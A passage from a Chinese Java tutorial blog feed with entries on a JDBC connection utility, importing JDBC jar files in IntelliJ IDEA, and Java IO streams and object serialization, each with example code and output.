class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Properties pr = <span class="hljs-keyword">new</span> Properties();<br>    <span class="hljs-keyword">static</span> &#123;<br>        InputStream is = MoreMove.class.getResourceAsStream(<span class="hljs-string">&quot;/db.properties&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            pr.load(is);<br>            Class.forName(pr.getProperty(<span class="hljs-string">&quot;driver&quot;</span>));<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title">getConnection</span><span class="hljs-params">()</span></span>&#123;<br>        Connection connection = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            connection = DriverManager.getConnection(pr.getProperty(<span class="hljs-string">&quot;url&quot;</span>),pr.getProperty(<span class="hljs-string">&quot;user&quot;</span>),pr.getProperty(<span class="hljs-string">&quot;password&quot;</span>));<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> connection;<br>    &#125;<br><br>  <span class="hljs-comment">//关闭函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">closeAll</span><span class="hljs-params">(Connection connection, Statement statement, ResultSet resultSet)</span></span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span>(resultSet != <span class="hljs-keyword">null</span>)&#123;<br>                resultSet.close();<br>            &#125;<br>            <span class="hljs-keyword">if</span>(statement != <span class="hljs-keyword">null</span>)&#123;<br>                statement.close();<br>            &#125;<br>            <span class="hljs-keyword">if</span>(connection != <span class="hljs-keyword">null</span>)&#123;<br>                connection.close();<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (SQLException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><br></code></pre></div></td></tr></table></figure><p>主函数 内容。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.Utils;<br><br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.PreparedStatement;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/11 14:53</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestMain</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Connection con = MoreMove.getConnection();<br>        PreparedStatement ps = con.prepareStatement(<span class="hljs-string">&quot;select * from Te&quot;</span>);<br>        ResultSet rs = ps.executeQuery();<br><br>        <span class="hljs-keyword">while</span>(rs.next())&#123;<br>            String s1 = rs.getString(<span class="hljs-number">1</span>);<br>            String s2 = rs.getString(<span class="hljs-number">2</span>);<br>            String s3 = rs.getString(<span class="hljs-number">3</span>);<br>            System.out.println(s1 + <span class="hljs-string">&quot; | &quot;</span> + s2 + <span class="hljs-string">&quot; | &quot;</span> + s3 + <span class="hljs-string">&quot; | &quot;</span>);<br>        &#125;<br>        MoreMove.closeAll(con,ps,rs);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>星星之火-IDEA导入JDBC所需jar包</title>
    <link href="/2021/08/11/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-IDEA%E5%AF%BC%E5%85%A5JDBC%E6%89%80%E9%9C%80jar%E5%8C%85/"/>
    <url>/2021/08/11/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-IDEA%E5%AF%BC%E5%85%A5JDBC%E6%89%80%E9%9C%80jar%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<p>积土成山，风雨兴焉；积水成渊，蛟龙生焉；积善成德，而神明自得，圣心备焉。故不积跬步，无以至千里，不积小流无以成江海。齐骥一跃，不能十步，驽马十驾，功不在舍。面对悬崖峭壁，一百年也看不出一条裂缝来，但用斧凿，能进一寸进一寸，能进一尺进一尺，不断积累，飞跃必来，突破随之。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>直接通过IDEA进行导入。<br>File -&gt; Project Structure 。再按图进行。如果没有2，则点击上面的那个加号添加即可。</p><p><img src="https://img-blog.csdnimg.cn/f122fe30ab2e4fffb049d59af4df433d.png"></p><p><img src="https://img-blog.csdnimg.cn/406e21c5207b41cebcb60865b68c6b83.png"></p><p>之后选着JDBC的连接 jar 包即可。</p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>首先在项目文件夹下建一个 <code>lib</code>文件夹，然后直接将 jar 包复制进去。再选中 <code>lib</code> 文件夹，右键 -&gt;  Add As libiary··· 。或者在工具栏的 build 中重写构建一下。 </p>]]></content>
    
    
    <categories>
      
      <category>星星之火</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
      <tag>JDBC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础学习-IO流</title>
    <link href="/2021/08/07/JAVA/JAVA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-IO%E6%B5%81/"/>
    <url>/2021/08/07/JAVA/JAVA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-IO%E6%B5%81/</url>
    
    <content type="html"><![CDATA[<p>Java的核心库java.io提供了全面的IO接口。包括：文件读写、标准设备输出等。Java中IO是以流为基础进行输入输出的，所有数据被串行化写入输出流，或者从输入流读入。在整个Java.io包中最重要的就是5个类和一个接口。5个类指的是File、OutputStream、InputStream、Writer、Reader；一个接口指的是Serializable。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p><img src="https://img-blog.csdnimg.cn/28b39d059ce846b0ac57c0c76abd4ea3.webp"></p><p><img src="https://img-blog.csdnimg.cn/ec32126fb1e14a979b4a581d41da86d9.jpg"></p><h2 id="1-IO流"><a href="#1-IO流" class="headerlink" title="1.IO流"></a>1.IO流</h2><h3 id="1-1-分类"><a href="#1-1-分类" class="headerlink" title="1.1 分类"></a>1.1 分类</h3><blockquote><ol><li>按方向</li></ol></blockquote><ul><li><p>输入流：将 存储设备 中的内容读入到 内存 中。</p></li><li><p>输出流：将 内存 中的内容写入到 存储设备 中。</p></li></ul><blockquote><ol start="2"><li>按单位</li></ol></blockquote><ul><li><p>字节流：以字节为单位，可以读写所有数据 。</p></li><li><p>字符流：以字符为单位，只能读写文本数据。</p></li></ul><blockquote><ol start="3"><li>按功能</li></ol></blockquote><ul><li><p>节点流：具有实际传输数据的读写功能。</p></li><li><p>过滤流：在节点流的基础之上增强功能。</p></li></ul><h2 id="2-字节流"><a href="#2-字节流" class="headerlink" title="2.字节流"></a>2.字节流</h2><p>字节流的父类为抽象类。</p><h3 id="2-1-字节输入流（InputStream）"><a href="#2-1-字节输入流（InputStream）" class="headerlink" title="2.1 字节输入流（InputStream）"></a>2.1 字节输入流（InputStream）</h3><p>InputStream就是Java标准库提供的最基本的输入流。它位于java.io这个包里。java.io包提供了所有同步IO的功能。InputStream并不是一个接口，而是一个抽象类，它是所有输入流的超类。这个抽象类定义的一个最重要的方法就是int read()。这个方法会读取输入流的下一个字节，并返回字节表示的int值（0~255）。如果已读到末尾，返回-1表示不能继续读取了。</p><ul><li><p>int    read()：从该输入流读取一个字节的数据。返回字节的ASCII码。</p></li><li><p>int    read(byte[] b)：从该输入流读取最多 b.length个字节的数据为字节数组。返回读取的字节数。</p></li><li><p>int    read(byte[] b, int off, int len)：从该输入流读取最多 len字节的数据为字节数组。</p></li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//===================================================</span><br><span class="hljs-comment">//单个字节读取</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        InputStream is = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;src/main/java/com/IO/dataTeas.txt&quot;</span>);<br>        <span class="hljs-keyword">int</span> mi = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>((mi=is.read())!=-<span class="hljs-number">1</span>)&#123;<br>            System.out.print(mi);<br>            System.out.println((<span class="hljs-keyword">char</span>)mi);<br>        &#125;<br>        is.close();<br>    &#125;<br><br><span class="hljs-comment">//输出结果</span><br>113q<br>101e<br>119w<br>114r<br><br><br><br><span class="hljs-comment">//===================================================</span><br><span class="hljs-comment">//一次读取多个字节</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        InputStream is = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;src/main/java/com/IO/dataTeas.txt&quot;</span>);<br>        <span class="hljs-keyword">byte</span>[] by = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">3</span>];<br>        <span class="hljs-keyword">int</span> cnt = is.read(by);<br>        System.out.println(cnt);<br>        System.out.println(<span class="hljs-keyword">new</span> String(by));<br><br>        cnt = is.read(by);<br>        System.out.println(cnt);<br>        System.out.println(<span class="hljs-keyword">new</span> String(by));<br><br>        cnt = is.read(by);<br>        System.out.println(cnt);<br>        System.out.println(<span class="hljs-keyword">new</span> String(by));<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        cnt = is.read(by);</span><br><span class="hljs-comment">        System.out.println(cnt);</span><br><span class="hljs-comment">        System.out.println(new String(by,0,cnt));</span><br><span class="hljs-comment">        */</span><br>        cnt = is.read(by);<br>        System.out.println(cnt);<br>        System.out.println(<span class="hljs-keyword">new</span> String(by));<br><br>        is.close();<br>    &#125;<br><br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">3</span><br>qwe<br><span class="hljs-number">3</span><br>rty<br><span class="hljs-number">3</span><br>uio<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1</span><br><span class="hljs-comment">p</span><br><span class="hljs-comment">*/</span><br><span class="hljs-number">1</span><br>pio<br><br><br><span class="hljs-comment">//简写</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        InputStream is = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;src/main/java/com/IO/dataTeas.txt&quot;</span>);<br>        <span class="hljs-keyword">byte</span>[] by = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">3</span>];<br>        <span class="hljs-keyword">int</span> cnt = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(( cnt = is.read(by)) != -<span class="hljs-number">1</span> )&#123;<br>        System.out.println(cnt);<br>        System.out.println(<span class="hljs-keyword">new</span> String(by,<span class="hljs-number">0</span>,cnt));<br>        &#125;<br><br>        is.close();<br>    &#125;<br><br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">3</span><br>qwe<br><span class="hljs-number">3</span><br>rty<br><span class="hljs-number">3</span><br>uio<br><span class="hljs-number">1</span><br>p<br></code></pre></div></td></tr></table></figure><h3 id="2-2-字节输出流（OutputStream）"><a href="#2-2-字节输出流（OutputStream）" class="headerlink" title="2.2 字节输出流（OutputStream）"></a>2.2 字节输出流（OutputStream）</h3><ul><li><p>FileOutputStream(String name)：创建文件输出流以指定的名称写入文件。</p></li><li><p>FileOutputStream(String name, boolean append)：创建文件输出流以指定的名称写入文件，append表示是否追加。</p></li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//===================================================</span><br><span class="hljs-comment">//写入单个字符</span><br>OutputStream os = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;src/main/java/com/IO/dataTest.txt&quot;</span>);<br>        os.write(<span class="hljs-number">98</span>);<br>        os.write(<span class="hljs-string">&#x27;c&#x27;</span>);<br>        os.write(<span class="hljs-string">&#x27;q&#x27;</span>);<br>        os.close();<br><br><span class="hljs-comment">//写入结果</span><br>bcq<br><br><br><br><span class="hljs-comment">//===================================================</span><br><span class="hljs-comment">//写入字符串</span><br>OutputStream os = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;src/main/java/com/IO/dataTest.txt&quot;</span>);<br>        String tt = <span class="hljs-string">&quot;qwertruyiop&quot;</span>;<br>        os.write(tt.getBytes()); <span class="hljs-comment">//获取字符串的字节数组</span><br>        os.close();<br><br><span class="hljs-comment">//写入结果</span><br>qwertruyiop<br><br><br><span class="hljs-comment">//===================================================</span><br><span class="hljs-comment">//追加写入</span><br><span class="hljs-comment">//再次运行上述代码</span><br>OutputStream os = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;src/main/java/com/IO/dataTest.txt&quot;</span>,<span class="hljs-keyword">true</span>); <span class="hljs-comment">//注意区别</span><br>        String tt = <span class="hljs-string">&quot;qwertruyiop&quot;</span>;<br>        os.write(tt.getBytes());<br>        os.close();<br><br><span class="hljs-comment">//写入结果</span><br>qwertruyiopqwertruyiop<br></code></pre></div></td></tr></table></figure><h3 id="2-3-演示示例（复制功能）"><a href="#2-3-演示示例（复制功能）" class="headerlink" title="2.3 演示示例（复制功能）"></a>2.3 演示示例（复制功能）</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br><br>    FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;src/main/java/com/IO/binary.jpg&quot;</span>); <span class="hljs-comment">//读入源文件</span><br>    FileOutputStream fos = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;src/main/java/com/IO/binary2.jpg&quot;</span>); <span class="hljs-comment">//写入新文件</span><br>    <span class="hljs-keyword">byte</span>[] by = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">int</span> cnt = <span class="hljs-number">0</span> ;<br>    <span class="hljs-comment">//边读入边写入</span><br>    <span class="hljs-keyword">while</span>((cnt = fis.read(by))!=-<span class="hljs-number">1</span>)&#123;<br>        fos.write(by,<span class="hljs-number">0</span>,cnt);<br>    &#125;<br>    fis.close();<br>    fos.close();<br>    System.out.println(<span class="hljs-string">&quot;OK&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="3-字节缓冲流"><a href="#3-字节缓冲流" class="headerlink" title="3.字节缓冲流"></a>3.字节缓冲流</h2><blockquote><ol><li>BufferedInputStream</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br><br>        FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;src/main/java/com/IO/dataTest.txt&quot;</span>); <span class="hljs-comment">//输入节点流</span><br>        BufferedInputStream bis = <span class="hljs-keyword">new</span> BufferedInputStream(fis);  <span class="hljs-comment">//缓冲流</span><br>        <span class="hljs-keyword">int</span> cnt = <span class="hljs-number">0</span> ;<br>        <span class="hljs-keyword">while</span>((cnt = bis.read())!=-<span class="hljs-number">1</span>)&#123;<br>            System.out.print((<span class="hljs-keyword">char</span>)cnt);<br>        &#125;<br>        bis.close(); <span class="hljs-comment">//可以不再写fis.close()了，bis.close()内部已经有了</span><br>    &#125;<br><br><span class="hljs-comment">//输出结果</span><br>qwertruyiopqwertruyiop<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>BufferedOutputStream</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        FileOutputStream fos = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;src/main/java/com/IO/dataTest3.txt&quot;</span>);<br>        BufferedOutputStream bos = <span class="hljs-keyword">new</span> BufferedOutputStream(fos);<br>        String s = <span class="hljs-string">&quot;abcdef\r\n&quot;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span> ; i &lt;= <span class="hljs-number">3</span> ; ++i )&#123;<br>            bos.write(s.getBytes());<br>            bos.flush();<span class="hljs-comment">//如果不写flush()，则写入数据在没有超过缓冲区大小的情况下，文本中是没有数据的，因为都先存在了缓冲区中。而flush()就是用来刷新缓冲区的。</span><br>        &#125;<br>        bos.close(); <span class="hljs-comment">//其实，上面的flush()，也可以不写，因为bos.close()内部已经有了flush()。但在上面写可以保证数据不丢失。在这里的flush()是在全部存入后再写入文本。</span><br>    &#125;<br><br><span class="hljs-comment">//dataTest3.txt</span><br>abcdef<br>abcdef<br>abcdef<br><br></code></pre></div></td></tr></table></figure><h2 id="4-序列化与反序列化"><a href="#4-序列化与反序列化" class="headerlink" title="4.序列化与反序列化"></a>4.序列化与反序列化</h2><p>序列化是指把一个Java对象（类）变成二进制内容，本质上就是一个byte[]数组。反序列化，即把一个二进制内容（也就是byte[]数组）变回Java对象。</p><p>一个Java对象要能序列化，必须实现一个特殊的java.io.Serializable接口。Serializable接口没有定义任何方法，它是一个空接口。我们把这样的空接口称为“标记接口”（Marker Interface），实现了标记接口的类仅仅是给自身贴了个“标记”，表明可以序列化，其并没有增加任何方法。</p><h3 id="4-1-序列化"><a href="#4-1-序列化" class="headerlink" title="4.1 序列化"></a>4.1 序列化</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//========================== Person.class</span><br><span class="hljs-keyword">package</span> com.Serializable;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/6 19:13</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>  <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123; <span class="hljs-comment">//必须实现接口，否则会报错</span><br>    <span class="hljs-keyword">public</span> String name ;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> age ; <span class="hljs-comment">//序列化类中的对象属性也要实现Serializable接口，比如是其他类时</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">(String name, <span class="hljs-keyword">int</span> age)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//================================= 主函数</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        FileOutputStream fos = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;src/main/java/com/Serializable/test.bin&quot;</span>);<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(fos);<br>        <span class="hljs-comment">//序列化（写入操作）</span><br>        Person pp = <span class="hljs-keyword">new</span> Person(<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-number">23</span>);<br>        oos.writeObject(pp);<br>        <br>        oos.close(); <span class="hljs-comment">//包含flush()操作</span><br>    &#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="4-2-反序列化"><a href="#4-2-反序列化" class="headerlink" title="4.2 反序列化"></a>4.2 反序列化</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(<span 